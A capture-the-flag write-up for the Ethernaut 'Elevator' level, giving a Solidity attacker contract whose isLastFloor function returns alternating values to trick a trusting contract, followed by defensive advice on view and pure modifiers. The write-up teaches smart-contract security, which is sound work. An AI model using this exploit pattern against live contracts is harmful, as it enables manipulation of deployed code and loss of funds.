# Elevator

## Challenge Statement

This elevator won't let you reach the top of your building. Right?
Things that might help:

    Sometimes solidity is not good at keeping promises.
    This Elevator expects to be used from a Building.


## Analysis

The external interface here can be implemented by our own contract. We simply need to create a contract which calls the goTo function and have a function which flips the isLastFloor boolean value, starting at false.

## Solution

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface Elevator {
    function goTo(uint _floor) external;
}


contract Building {

    bool public flip;
    Elevator targetElevator = Elevator(<ethernaut_contract_address>);

    constructor() public {
        flip = true;
    }

    function go() public {
        targetElevator.goTo(10);
    }

    function isLastFloor(uint) public returns (bool) {
        flip = !flip;
        return flip;
    }

}
```

##  Moral

You can use the view function modifier on an interface in order to prevent state modifications. The pure modifier also prevents functions from modifying the state. Make sure you read Solidity's documentation and learn its caveats.

An alternative way to solve this level is to build a view function which returns different results depends on input data but don't modify state, e.g. gasleft().